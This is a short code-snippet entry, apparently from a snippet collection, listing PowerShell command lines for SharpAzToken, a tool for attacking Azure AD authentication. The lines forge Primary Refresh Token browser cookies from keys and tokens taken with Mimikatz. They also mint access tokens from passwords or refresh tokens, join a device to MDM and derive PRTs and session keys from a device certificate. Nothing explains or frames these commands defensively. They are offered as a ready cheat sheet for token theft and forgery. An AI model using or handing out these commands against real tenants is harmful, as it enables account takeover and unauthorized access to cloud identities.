---
id: 1b8b664f-0132-4c83-bf47-0758e748d662
type: code
language: Powershell
verified: false
created_at: '2023-05-24T07:35:29.591774+00:00'
updated_at: '2023-05-24T07:39:51.599325+00:00'
---

# Code Snippet 1b8b664f

**Language**: Powershell

```powershell
# Create a PRT-Cookie for the browser
SharpAzToken.exe cookie --derivedkey <Key from Mimikatz> --context <Context from Mimikatz> --prt <PRT from Mimikatz>

# Create a token
SharpAzToken.exe token --username <Username> --password <Password>

# Create a token from a refresh token
SharpAzToken.exe token --refreshtoken <RefreshToken>

# Join a deivce to MDM
SharpAzToken.exe mdm --joindevice --accesstoken (or some combination from the token part) --devicename <Name> --outpfxfile <Some path>

# Generate PRT and session key from a Device Certificate (device must be joined to MDM first)
SharpAzToken.exe devicekeys --pfxpath XXXX.pfx --refreshtoken (--prtcookie / ---username + --password )
```
